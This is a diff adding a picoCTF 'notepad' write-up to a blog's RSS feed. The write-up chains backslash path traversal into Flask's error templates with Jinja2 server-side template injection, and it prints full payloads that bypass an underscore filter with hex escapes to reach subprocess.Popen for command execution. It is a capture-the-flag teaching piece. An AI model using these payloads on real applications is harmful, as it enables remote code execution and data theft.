@@ -1,4 +1,99 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Logan MacLaren</title><link>https://maclarel.github.io/posts/</link><description>Recent content in Posts on Logan MacLaren</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Tue, 23 Nov 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://maclarel.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Home lab updates v2</title><link>https://maclarel.github.io/posts/2021-11/home_lab_updates/</link><pubDate>Tue, 23 Nov 2021 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2021-11/home_lab_updates/</guid><description>Looks like the last time I posted any updates about my home lab setup was back in April of 2020, so I guess we&amp;rsquo;re do for an update!
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Logan MacLaren</title><link>https://maclarel.github.io/posts/</link><description>Recent content in Posts on Logan MacLaren</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Sat, 26 Mar 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://maclarel.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>picoCTF - notepad</title><link>https://maclarel.github.io/posts/1963-08/pico_notepad/</link><pubDate>Sat, 26 Mar 2022 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/1963-08/pico_notepad/</guid><description>Premise We&amp;rsquo;re given a service that will take abitrary input, and render it as an HTML page.
+There are a few restrictions:
+Content cannot be longer than 512 characters Content cannot include _ or / characters Lastly, from the Dockerfile we know that the flag is going to have an arbtirary name starting with flag-.
+Examining the tarball This challenge comes with a tarball that contains the source code so we can do some white box analysis of how all of this works.</description><content type="html"><![CDATA[<h1 id="premise">Premise</h1>
+<p>We&rsquo;re given a service that will take abitrary input, and render it as an HTML page.</p>
+<p>There are a few restrictions:</p>
+<ul>
+<li>Content cannot be longer than 512 characters</li>
+<li>Content cannot include <code>_</code> or <code>/</code> characters</li>
+</ul>
+<p>Lastly, from the <code>Dockerfile</code> we know that the flag is going to have an arbtirary name <em>starting with</em> <code>flag-</code>.</p>
+<h1 id="examining-the-tarball">Examining the tarball</h1>
+<p>This challenge comes with a tarball that contains the source code so we can do some white box analysis of how all of this works.</p>
+<p>At a high level, we can see that this is a Flask app (SSTI&hellip;?), and that we&rsquo;ve got a flag, and <code>static</code> and <code>templates/errors</code> directories.</p>
+<p>From <code>app.py</code>, we can see how some of the application logic is enforced:</p>
+<pre><code>def create():
+    content = request.form.get(&quot;content&quot;, &quot;&quot;)
+    if &quot;_&quot; in content or &quot;/&quot; in content:
+        return redirect(url_for(&quot;index&quot;, error=&quot;bad_content&quot;))
+    if len(content) &gt; 512:
+        return redirect(url_for(&quot;index&quot;, error=&quot;long_content&quot;, len=len(content)))
+    name = f&quot;static/{url_fix(content[:128])}-{token_urlsafe(8)}.html&quot;
+    with open(name, &quot;w&quot;) as f:
+        f.write(content)
+    return redirect(name)
+</code></pre><p>We&rsquo;re taking arbitrary input from the form in <code>index.html</code>, checking if it contains <code>_</code> or <code>/</code> (throw a <code>bad_content</code> error if so), then checking if it is &gt; 512 charactersx in length (throw a <code>long_content</code> error if so.</p>
+<p>From there, a name for the resultant file is generated using the <em>first 128 characters of the content</em> (!!), and then an arbitrary random suffix to avoid collisions.</p>
+<p>Lastly, the file is written out, and the user is redirected to it.</p>
+<h1 id="where-do-we-start">Where do we start?</h1>
+<p>First off, since we&rsquo;re generating a filename using only the first 128 characters, we can use that as padding, e.g. content of <code>12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678foobarbaz</code> will give us a file name of <code>12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-pGVBCkNvTLY.html</code>. For whatever we want to include so that it won&rsquo;t break the URL (e.g. if we wanted to use iframes to try to retrieve other content, relative pages, etc&hellip;). This may or may not be useful, but at face value cannot be used to retrieve content outside of the <code>static</code> dir.</p>
+<p>If we try to do something simple like creating a new file outside of the <code>static</code> subdir, we&rsquo;ll just get a 500 error. For example, submitting content of <code>..\templates\foo.html</code> just results in <code>Internal Server Error</code> and no file creation. Similarly, attempts at LFI outside of the scope of the <code>static</code> dir through <code>iframes</code> will 404.</p>
+<p>The attack surface as far as I can see it at this point is to try to do something like add a new error page, or overwrite the existing error pages (this should be possible due to how the file is being opened, <code>w</code>), with content that will allow us to gain further access.</p>
+<h1 id="what-does-traffic-look-like">What does traffic look like?</h1>
+<p>If we proxy traffic through Burp (or anything similar), we&rsquo;re just doing a basic POST with a <code>content</code> parameter:</p>
+<pre><code>POST /new HTTP/1.1
+Host: localhost:8000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 14
+Origin: http://localhost:8000
+Connection: close
+Referer: http://localhost:8000/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+
+
+content=foobar
+</code></pre><p>Good news is this is easy enough for us to play with in Repeater &amp; Intruder if we wanted to, but in retrospect it won&rsquo;t save much time.</p>
+<h1 id="error-templates">Error templates</h1>
+<p>Another factor here is that looking at the error templates, these are included <em>based on a URL parameter</em>, so again, if we can create a new template, it&rsquo;s trivial for us to call it.</p>
+<p>For example, running the docker container, if we write out an arbitrary <code>templates/errors/foo.html</code> file that contains whatever we want, we can just call it from <code>http://localhost:8000/?error=foo</code>.</p>
+<p>But how do we do this&hellip;?</p>
+<p>The first lead is that the application is using <code>url_fix</code>, which is going to change <code>\</code> characters to <code>/</code> for us, so that part of the content filtering is irrelevant. If we try a payload of <code>..\templates\errors\</code> we get some curious behaviour&hellip; the returned URL is <code>http://localhost:8000/templates/errors/-AkAtr82ZpXU.html</code>, and if we look at the local filesystem:</p>
+<pre><code>root@bb0be7618f85:/app# ls templates/errors/
+-AkAtr82ZpXU.html  bad_content.html  long_content.html
+</code></pre><p>We have a way to create arbitrary files! We also know that we can manage the creation of the filename, and that content beyond the 128th character (but under 512) is entirely under our control.</p>
+<p>Let&rsquo;s try a payload of:</p>
+<pre><code>..\templates\errors\12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678
+
+foobarbaz
+</code></pre><p>Predictably, this will 404, but we get a returned URL of <code>http://localhost:8000/templates/errors/123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-ZyKmdETiOlI.html</code>. Since we know this file <em>will</em> exist on the file system, we can also now try calling it as an error since we know the filename in whole by hitting <code>http://localhost:8000/?error=123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-ZyKmdETiOlI</code>.</p>
+<p>Sure enough, the full content is returned in the page content!</p>
+<pre><code> error: 123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-ZyKmdETiOlI
+..\templates\errors\12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678 foobarbaz
+make a new note
+...
+</code></pre><h1 id="ssti">SSTI?</h1>
+<p>We&rsquo;ve got the ability to create arbitrary files, with content we <em>largely</em> control. Let&rsquo;s explore this further and see what vulnerabilities there are. To start, let&rsquo;s try a typical <code>{{ 7 * 7 }}</code> payload after our padding.</p>
+<p>The rendered content?</p>
+<pre><code>..\templates\errors\12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678 49 
+</code></pre><p>Note that 49! Woohoo! Alright, we know we can&rsquo;t include <code>_</code> characters in the content, but can we encode this in a different way? Perhaps a hex <code>\x5f</code>? Yes!</p>
+<pre><code>{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()}}
+</code></pre><p>Sure enough, this also includes <code>&lt;class 'subprocess.Popen'&gt;</code> (position 273 in my case), so we&rsquo;re in business.</p>
+<h1 id="time-for-rce">Time for RCE!</h1>
+<p>With the hex form of <code>_</code> unfiltered, and access to <code>subprocess.Popen</code> we can use the following payload to proce out RCE:</p>
+<pre><code>..\templates\errors\123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678 {{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(273)('ls',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')}}
+</code></pre><p>Pass the resulting error page filename (minus URL) into <code>localhost:8000/?error=&lt;namehere&gt;</code>, and we get:</p>
+<pre><code> error: 123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-gt_Z1Bro-iE
+..\templates\errors\123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678 app.py flag-bae52e25-3397-45de-8f53-f9e9a1d6a416.txt static templates 
+</code></pre><p>And with one final tweak to run <code>cat flag*</code> instead of <code>ls</code>:</p>
+<pre><code> error: 123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-WRn7y2p0oMg
+..\templates\errors\123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678 foobarbaz 
+</code></pre><pre><code>root@bb0be7618f85:/app# cat flag-bae52e25-3397-45de-8f53-f9e9a1d6a416.txt 
+foobarbaz
+</code></pre><p>I&rsquo;ll leave you to get the flag for yourself on the live system ;)</p>
+<p>Helpful reference:</p>
+<ul>
+<li><a href="https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f">Jinja2 SSTI filter bypasses</a></li>
+</ul>
+]]></content></item><item><title>Home lab updates v2</title><link>https://maclarel.github.io/posts/2021-11/home_lab_updates/</link><pubDate>Tue, 23 Nov 2021 00:00:00 +0000</pubDate><guid>https://maclarel.github.io/posts/2021-11/home_lab_updates/</guid><description>Looks like the last time I posted any updates about my home lab setup was back in April of 2020, so I guess we&amp;rsquo;re do for an update!
 What has changed? Server rebuild New (2nd hand) 24 port gigabit switch 900W UPS Synology DS918 NAS So what am I doing with all these toys? The server rebuild is probably one of the bigger things here. While I was already hosting VMs and Docker containers on this box when it was running Windows, it was unreliable at best thanks to forced updates/reboots in Windows 10.</description><content type="html"><![CDATA[<p>Looks like the last time I posted any updates about my home lab setup was back in April of 2020, so I guess we&rsquo;re do for an update!</p>
 <h1 id="what-has-changed">What has changed?</h1>
 <ul>
